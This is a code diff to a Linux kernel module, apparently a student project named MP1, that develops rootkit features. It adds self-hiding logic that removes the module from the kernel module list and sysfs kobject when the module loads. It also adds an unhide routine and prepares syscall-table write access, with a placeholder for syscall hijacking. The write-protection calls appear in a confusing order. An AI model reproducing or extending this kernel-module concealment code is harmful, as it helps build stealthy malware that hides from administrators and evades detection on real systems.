@@ -122,11 +122,17 @@ static int get_syscall_table(void){
 	// since we don't have to malloc new var.
 	if(  (syscall_table_pointer = simple_strtoull(sys_call_table_addr_input, NULL, 16)) ){
 
-		pr_info("get syscall_table successfull\n Disabling write-protection...");
+		pr_info("get syscall_table successfull");
+
+		pr_info("Disabling write-protection...");
 
 		enable_write_protect();
 
+		// TODO: ADD syscall hijack
+
 		disable_write_protect();
+
+		pr_info("Enabling write-protection...");
 
 		return 0;	
 	}
@@ -136,23 +142,31 @@ static int get_syscall_table(void){
 	return -EINVAL;	
 }
 
-static struct kobject backup_module;
-
+static struct kobject backup_module_kobj;
+static struct module this_module;
+// static struct list_head *module_list;
 static int hide_self(void){
 
 	if(!is_rootkit_hidden){
 
 		// Store previous module list_head to restore later
-		moduleList = *(THIS_MODULE->list.prev);
+		// module_list = THIS_MODULE->list.prev;
+		this_module = *THIS_MODULE;
+		//list_add(THIS_MODULE->list.prev,&moduleList);
 
-		// Backup this model kernel_object
-		backup_module = THIS_MODULE->mkobj.kobj;
+		// // Backup this model kernel_object
+		backup_module_kobj = THIS_MODULE->mkobj.kobj;
 
-		list_del_init(&(THIS_MODULE->list));
-
+		// Not sure how to backup this for now.
 		kobject_del(&(THIS_MODULE->mkobj.kobj));
+		
 
+		list_del(&(THIS_MODULE->list));
+
+		
 		is_rootkit_hidden = 1;
+
+		pr_info("Hide successfull.");
 	}
 
 	return 0;
@@ -164,11 +178,22 @@ static int unhide_self(void){
 
 	if(is_rootkit_hidden){
 
-		list_add( &(THIS_MODULE->list), &moduleList);
+		list_add( &(THIS_MODULE->list), &this_module.list);
 
-		ret = kobject_add(&backup_module, NULL, "rootkit");
+		this_module.mkobj.kobj = backup_module_kobj;
+	
+		ret = kobject_add(&this_module.mkobj.kobj, this_module.mkobj.kobj.parent, "rootkit");
+
+		if(ret){
+			kobject_put(&this_module.mkobj.kobj);
+			return -1;
+		}
+		
+
 
 		is_rootkit_hidden = 0;
+
+		pr_info("Unhide successfull.");
 
 	}
 
@@ -334,6 +359,8 @@ int __init mp1_init(void)
 
 	get_syscall_table();
 
+	hide_self();
+
     pr_alert("MP1 MODULE LOADED\n");
 
     return 0;   
@@ -354,6 +381,8 @@ void __exit mp1_exit(void)
       list_del(&currProc->list);
       kfree(currProc);
     }
+
+    unhide_self();
    
 
     pr_alert("MP1 MODULE UNLOADED\n");
